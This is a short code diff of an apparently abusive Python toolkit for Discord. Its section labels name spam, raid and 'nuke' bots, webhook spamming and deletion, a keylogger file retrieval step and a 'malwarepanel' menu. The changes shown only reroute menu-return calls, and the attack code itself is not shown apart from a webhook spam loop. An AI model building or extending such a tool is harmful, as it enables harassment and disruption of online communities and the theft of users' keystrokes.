@@ -71,7 +71,7 @@ Client.login("token")
     sleep(0.5)
     os.remove("Spam.js")
     clear()
-    mainpanel()
+    botpanel()
 
 
 #raid bot
@@ -113,7 +113,7 @@ Client.login("token")
   sleep(0.5)
   os.remove("Raid.js")
   clear()
-  mainpanel()
+  botpanel()
 
 
 
@@ -155,7 +155,7 @@ Client.login("token")
     sleep(0.5)
     os.remove("Nuke.js")
     clear()
-    mainpanel()
+    botpanel()
 
 
 #webhook spam
@@ -178,7 +178,7 @@ def webhookspam():
         sleep(delay/1000)
         print(f"Spam N°{i} sent")
     clear()
-    mainpanel()
+    webhookpanel()
 
 
 #webhooks infos
@@ -196,7 +196,7 @@ def webhookinfos():
     Channel ID : {webhook.get_info().channel_id}""")
     input("Press enter to finish...")
     clear()
-    mainpanel()
+    webhookpanel()
 
 
 #delete webhook
@@ -212,7 +212,7 @@ def webhookdelete():
     except:
         pass
     clear()
-    mainpanel()
+    webhookpanel()
 
 
 
@@ -228,7 +228,7 @@ def webhookmessage():
     file = input("File directory : ")  
     webhook.send(message)
     clear()
-    mainpanel()
+    webhookpanel()
 
 
 #get keylogger file
@@ -357,7 +357,7 @@ while True:
   print("Done !")
   input("Press enter to finish...")
   clear()
-  mainpanel()
+  malwarepanel()
 
 
 
